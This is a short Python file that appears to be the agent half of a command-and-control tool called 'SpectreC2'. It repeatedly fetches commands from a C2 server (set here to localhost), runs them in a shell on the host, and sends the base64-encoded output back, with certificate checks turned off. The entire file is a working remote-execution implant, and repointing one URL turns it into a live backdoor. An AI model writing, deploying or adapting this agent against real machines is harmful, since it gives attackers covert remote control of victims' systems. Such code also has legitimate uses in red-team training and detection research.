import requests
import time
import subprocess
import ssl
import os
import json
import base64
import platform

C2_URL = "http://127.0.0.1:5000"
AGENT_ID = platform.node() + "-SpectreC2"
HEADERS = {"Content-Type": "application/json"}

def get_command():
    try:
        r = requests.get(f"{C2_URL}/command", verify=False)
        if r.status_code == 200:
            return r.json().get("cmd")
    except:
        return ""

def execute(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        result = e.output
    return base64.b64encode(result).decode()

def report_output(output):
    data = {
        "agent": AGENT_ID,
        "output": output
    }
    try:
        requests.post(f"{C2_URL}/receive", headers=HEADERS, json=data, verify=False)
    except:
        pass

def main():
    while True:
        cmd = get_command()
        if cmd:
            output = execute(cmd)
            report_output(output)
        time.sleep(10)

if __name__ == '__main__':
    main()
